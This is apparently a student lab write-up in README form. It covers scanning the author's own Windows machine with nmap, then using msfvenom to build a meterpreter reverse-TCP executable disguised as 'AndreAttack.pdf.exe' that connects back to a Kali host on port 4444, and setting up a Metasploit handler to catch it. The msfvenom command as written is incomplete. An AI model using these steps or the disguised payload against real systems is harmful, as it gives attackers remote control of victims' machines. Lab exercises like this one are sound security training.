### Step 1: Checking Nmap Commands and Syntax
- Used the command:
  ```bash
  nmap -h
![Step1](https://github.com/user-attachments/assets/ee1f6cfa-cd10-4520-becc-d57480418288)


### Step 2: Used nmap -A with my windows machine IP to check for open ports
- Used the command:
  ```bash
  nmap -A
![Step2 1](https://github.com/user-attachments/assets/cfb32c6e-12c7-4496-b523-9e1cb9ab7cdb)


### Step 3: - Used command "msfvenom -l payloads" to check for commands with payloads used "-l"  and "payloads" to list the payloads commands
- Used the command:
  ```bash
  msfvenom -l
![Step3_Payloads](https://github.com/user-attachments/assets/ad3632bf-3a7f-4694-a9dc-08c4884ae7df)


### Step 4: -From the payloads, I selected the `"windows/x64/meterpreter_reverse_tcp"`, and proceeded with this command:
```bash
windows/x64/meterpreter_reverse_tcp lhost=192.132.69.50 lport=4444 -f exe -o AndreAttack.pdf.exe
```
![Step4](https://github.com/user-attachments/assets/ae135d67-802a-4c91-ae55-08cc54904c31)

With this command i added the host ip (my Kali VM), and a random port `4444`.This command will generate a malware using meterpreter reverse tcp load. Which is instructed to connect back to our machine based on `lhost`, the file format will be in ".exe" with the name of `AndreAttack.pdf`,
as you can see from the screenshot below, i successed created the file and checked if the file is present using the `ls` command.
As we can see by using `file` we can access the file contents.

![step4 1](https://github.com/user-attachments/assets/d9d87b86-b10d-431d-ae7b-ee3f841dc85e)


### Step 5: - In this step i used metasploit by typing the command `msfconsole`.
- Used the command:
  ```bash
  msf
 ![6t](https://github.com/user-attachments/assets/559904d9-c420-4f0d-8660-bfbd59598c37)
### 5.1 Then proceeded to `use exploit/multi/handler`, and then `options`, to see what we can configure.
![5 1](https://github.com/user-attachments/assets/4da75551-7f64-4776-a1f9-fdfaed6e88cd)


### Step 6: We can see the payloadoptions to "generic/shell_reverse_tcp", i will change this payload so it can be the same payload that i use when configuring the malware on msfvenom earlier.
- Used the command:
  ```bash
  set payload windows/x64/meterpreter/reverse_tcp
  ```
Then i applied `options` again to change to my command.

![6 1](https://github.com/user-attachments/assets/ae64a0ed-617d-4083-b13b-9a15ad35d50d)



